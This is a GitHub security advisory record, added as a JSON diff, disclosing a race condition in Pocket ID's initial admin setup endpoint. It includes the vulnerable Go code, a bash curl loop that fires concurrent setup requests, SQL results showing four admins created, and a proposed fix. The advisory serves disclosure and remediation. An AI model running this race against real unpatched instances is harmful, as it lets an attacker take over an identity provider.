@@ -1,0 +1,44 @@
+{
+  "global": null,
+  "id": "GHSA-x6w5-6mr5-mxrx",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "# Concurrent initial setup requests create multiple unauthenticated administrators\r\n\r\n## Summary\r\n\r\n`POST /api/signup/setup` is vulnerable to a time-of-check to time-of-use race on PostgreSQL. `SignUpInitialAdmin` starts a transaction, counts existing users, and creates an administrator when the count is zero. The transaction does not serialize this decision and there is no unique one-time setup marker.\r\n\r\nSeveral concurrent unauthenticated requests can therefore all observe an empty user table and each create a different administrator. Every successful request also receives a valid Pocket ID browser session for its new administrator.\r\n\r\nI reproduced this twice against the official `ghcr.io/pocket-id/pocket-id:v2` image, version `2.11.0`, with the official PostgreSQL configuration. The same vulnerable logic is still present on `main` at commit `6e859de2dd55dfc59d9cde3fab5d7a9789c6aca9`.\r\n\r\nThis report is submitted in response to the Pocket ID $1,000 critical vulnerability challenge.\r\n\r\n## Root cause\r\n\r\n`backend/internal/usersignup/service.go` performs a separate read and write in a normal transaction:\r\n\r\n```go\r\ntx := s.db.Begin()\r\n\r\nsetupCompleted, err := s.isInitialAdminSetupCompleted(ctx, tx)\r\nif setupCompleted {\r\n    return model.User{}, \"\", &common.SetupNotAvailableError{}\r\n}\r\n\r\nuser, err := s.userCreator.CreateUserInternal(ctx, config, userToCreate, false, tx)\r\n\r\nerr = tx.Commit().Error\r\n```\r\n\r\n`isInitialAdminSetupCompleted` only counts users:\r\n\r\n```go\r\nerr := db.WithContext(ctx).Model(&model.User{}).\r\n    Where(\"id != ?\", common.StaticApiKeyUserID).\r\n    Count(&userCount).Error\r\n\r\nreturn userCount != 0, nil\r\n```\r\n\r\nUnder PostgreSQL's default `READ COMMITTED` isolation, concurrent transactions can all complete the count before any of the new users commits. The users have different unique usernames and email addresses, so no database constraint makes the later inserts conflict.\r\n\r\n## Reproduction\r\n\r\n### Environment\r\n\r\n- Pocket ID image: `ghcr.io/pocket-id/pocket-id:v2`\r\n- Pocket ID version: `2.11.0`\r\n- PostgreSQL image: `postgres:17-alpine`\r\n- Fresh Pocket ID database\r\n- The Pocket ID port was bound only to localhost\r\n\r\n### Requests\r\n\r\nThe following sends 20 different setup requests at the same time:\r\n\r\n```bash\r\nfor n in $(seq -w 1 20); do\r\n  curl -sS \\\r\n    -o \"/tmp/setup-$n.body\" \\\r\n    -w \"%{http_code}\" \\\r\n    -H \"Content-Type: application/json\" \\\r\n    -d \"{\\\"username\\\":\\\"raceadmin$n\\\",\\\"email\\\":\\\"race$n@example.invalid\\\",\\\"firstName\\\":\\\"Race\\\",\\\"lastName\\\":\\\"$n\\\"}\" \\\r\n    http://127.0.0.1:21411/api/signup/setup \\\r\n    > \"/tmp/setup-$n.code\" &\r\ndone\r\nwait\r\n```\r\n\r\n### Result\r\n\r\nIn the first run, requests `01`, `02`, `11`, and `18` all returned HTTP 200 with different user IDs and `\"isAdmin\": true`.\r\n\r\nThe authoritative database query confirmed four administrators:\r\n\r\n```sql\r\nSELECT username, is_admin, created_at\r\nFROM users\r\nORDER BY created_at;\r\n```\r\n\r\n```text\r\nraceadmin18 | true | 2026-07-23 22:12:05.996637+00\r\nraceadmin02 | true | 2026-07-23 22:12:05.996826+00\r\nraceadmin11 | true | 2026-07-23 22:12:05.996973+00\r\nraceadmin01 | true | 2026-07-23 22:12:05.998432+00\r\n```\r\n\r\nI then reset the user state and repeated the test with 20 new identities. Requests `01`, `02`, `03`, and `18` again returned HTTP 200, and PostgreSQL again contained four distinct administrators.\r\n\r\nSequential requests behave correctly. Once one setup transaction commits, later requests are rejected. The issue is specifically the concurrent check and insert.\r\n\r\n## Impact\r\n\r\nAn unauthenticated attacker who races the legitimate owner during first-time setup can obtain a persistent administrator account and a valid administrator session.\r\n\r\nAn administrator can manage users, passkeys, OIDC clients and secrets, API permissions, signup and one-time access tokens, application configuration, SCIM providers, and user groups. In a real deployment, the attacker can retain control of the identity provider, issue further credentials, and compromise downstream services that trust Pocket ID.\r\n\r\nThe timing condition is practical. A small parallel request burst reproduced the issue on both attempts, with four successful administrators each time.\r\n\r\nSuggested classification:\r\n\r\n- CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization\r\n- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` (9.6)\r\n\r\nThe user interaction component represents the legitimate owner performing first-time setup while the attacker's burst is in flight.\r\n\r\n## Suggested fix\r\n\r\nMake the initial setup claim an atomic database operation inside the same transaction as user creation.\r\n\r\nThe existing `kv` table can provide a portable singleton guard for both PostgreSQL and SQLite:\r\n\r\n```sql\r\nINSERT INTO kv (key, value)\r\nVALUES ('initial_admin_setup_claimed', '1')\r\nON CONFLICT (key) DO NOTHING\r\nRETURNING value;\r\n```\r\n\r\nThe service should:\r\n\r\n1. Keep the existing user count check for installations that already completed setup before the guard existed.\r\n2. Attempt the singleton insert inside the current transaction.\r\n3. Return `SetupNotAvailableError` when the insert returns no row.\r\n4. Create the administrator and commit.\r\n\r\nThe unique key serializes concurrent claims. A losing transaction waits for the winner and then receives the conflict. If the winning transaction fails before user creation, its guard insert rolls back, so setup remains recoverable.\r\n\r\nUsing only `SELECT ... FOR UPDATE` on the users table is not sufficient when the table is empty because there is no row to lock.\r\n\r\n## Validation expectation\r\n\r\nA regression test should start with an empty PostgreSQL database, release several `SignUpInitialAdmin` calls from a barrier, and assert:\r\n\r\n- exactly one call succeeds;\r\n- exactly one non-static user exists;\r\n- that user is an administrator;\r\n- every losing call returns `SetupNotAvailableError`;\r\n- a failed winner transaction does not permanently consume the setup claim.\r\n\r\n",
+    "ghsa_id": "GHSA-x6w5-6mr5-mxrx",
+    "html_url": "https://github.com/pocket-id/pocket-id/security/advisories/GHSA-x6w5-6mr5-mxrx",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-x6w5-6mr5-mxrx"
+      }
+    ],
+    "published_at": "2026-07-29T23:04:21Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "Concurrent initial setup requests create multiple unauthenticated administrators",
+    "updated_at": "2026-07-29T23:04:22Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/pocket-id/pocket-id"
+        },
+        "patched_versions": "v2.12.0",
+        "vulnerable_version_range": "<= v2.11.0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "pocket-id/pocket-id"
+}
